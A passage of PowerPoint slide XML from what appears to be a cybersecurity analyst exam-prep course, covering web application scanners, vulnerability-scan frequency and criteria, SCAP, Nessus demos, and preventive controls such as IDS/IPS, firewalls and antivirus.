</p:sld>
</file>

<file path=ppt/slides/slide3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WEB APPLICATION SCANNERS, PART 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Web Application Scanners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OWASP Zed Attack Proxy (ZAP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Proxy inserted between client and server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Burp suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Also a proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  More manual</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  More granular control</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321</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WEB APPLICATION SCANNERS, PART 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Web Application Scanners (3)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Nikto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Web server vulnerability scanner</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Arachni</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fast, Ruby-based Web application scanner</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322</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Considerations, I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Before running vulnerability scans, teams must decide how often to scan, and frequency is often dictated by industry regulations that vary by sector, such as PCI DSS for card data or HIPAA for healthcare.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Frequency must be balanced against available resources, meaning the people qualified to run and interpret scans, the computational load scans place on systems and networks, and the time needed to complete scans and act on the results.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  More frequent scanning gives fresher risk data but consumes more of these finite resources and can strain production systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because setting the right cadence keeps the organization both compliant and operationally sustainable rather than drowning in scans it cannot process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions where a regulation or a resource limit dictates how often an organization should scan, testing that you know frequency is driven by both compliance and capacity.</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323</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Considerations, I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Frequency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Industry regulations help determine frequency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Regulations vary by industry</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Resources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  People</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Computation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Time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324</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Considerations, II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Beyond frequency, scanning must account for practical constraints, chiefly whether the organization has qualified personnel and the technical capacity of its tools and infrastructure to run scans without disruption.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Determining frequency also means weighing effects on workflow, since scans can slow networks and systems and interfere with business operations if run at the wrong times.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Resources are consumed at every stage, not just the scan itself but reviewing results, translating technical findings into language leadership understands, and assisting in the decision-making that follows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because ignoring these constraints leads to scans that either never get properly analyzed or that harm production, undermining the whole vulnerability management program.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for scenarios about operational constraints such as limited staff or workflow disruption, and questions recognizing that scanning cost includes analysis and reporting, not just running the scan.</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325</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Considerations, II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Constraints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Qualified personnel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technical capacity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Determining frequency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Effects on workflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Resources used to execute scans, review results, translate for leadership, and assist in decision making</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326</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Criteria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Configuring a vulnerability scan involves several key criteria: the feeds or plug-ins that supply up-to-date vulnerability definitions, the sensitivity of the target data, the scope of which systems are included, and the privilege level used to authenticate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scans are credentialed (authenticated with valid logins, giving deeper and more accurate results with fewer false positives) or non-credentialed (an outside-in view that sees only what an unauthenticated attacker would).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  They are also either server-based, executed from a central appliance reaching out across the network, or agent-based, where scanning software installed on each network node reports back and can cover devices that are mobile or intermittently connected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts choose these settings deliberately because they determine how thorough, accurate, and disruptive a scan is, and whether it fits the environment being assessed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions contrasting credentialed versus non-credentialed and agent-based versus server-based scanning, asking which is appropriate for a given depth, accuracy, or coverage requirement.</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327</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Vulnerability Scanning Criteria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Feeds</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sensitivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scope</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privilege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Credentialed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Non-credentialed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Server-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Scans executed from central point of contact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Agent-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Scanning software on all network nodes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328</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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Nessus Demo</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  NASL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SCAP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compliance checks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Report generation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_d982d7766c.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2358397"/>
            <a:ext cx="4937760" cy="3147046"/>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329</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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SCAP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The Security Content Automation Protocol (SCAP) is a suite of open specifications created and maintained by NIST that standardizes how security tools express, exchange, and report vulnerability and configuration information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It bundles component standards such as CVE for naming vulnerabilities, CVSS for scoring their severity, CCE for configuration items, CPE for naming products, XCCDF for checklists, and OVAL for the machine-readable logic of assessment checks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because every SCAP-compliant tool speaks the same formats, results from different scanners and platforms can be compared, automated, and audited consistently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because SCAP enables automated, repeatable compliance and vulnerability assessment across a diverse toolset instead of manual, tool-specific interpretation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You may be asked to identify SCAP as the NIST framework that standardizes vulnerability assessment and reporting, or to recognize its components such as CVE and CVSS.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330</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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SCANNING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SCAP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Security Content Automation Protocol (SCAP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Created by NIST</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Standardizes assessment &amp; reporting of vulnerabilities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331</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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CONFIGURING AND EXECUTING SCANS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Nessus Demo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g_cb2bd9e8c2.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2967975" y="1783080"/>
            <a:ext cx="6253001" cy="4434840"/>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332</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Preventative Tools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Preventative security tools are controls designed to stop or block malicious activity before it causes harm, forming the enforcement layer of defense.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An Intrusion Detection System (IDS) monitors traffic and alerts on suspicious activity but does not block it, whereas an Intrusion Prevention System (IPS) sits inline and can actively drop or reject malicious traffic in real time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewalls enforce rules on what network traffic is permitted between zones, while antivirus and antimalware detect and remove known malicious code on endpoints, increasingly using behavioral and signature-based methods.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because layering these preventative controls reduces the volume of incidents that reach investigation, though tuning is required to avoid gaps and false positives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing detective from preventative controls, especially the key difference that an IDS only alerts while an IPS actively blocks inline.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333</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Preventative Tools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Intrusion Detection Systems (IDSs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Intrusion Protection Systems (IPSs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Antivirus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Antimalware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewall</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334</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

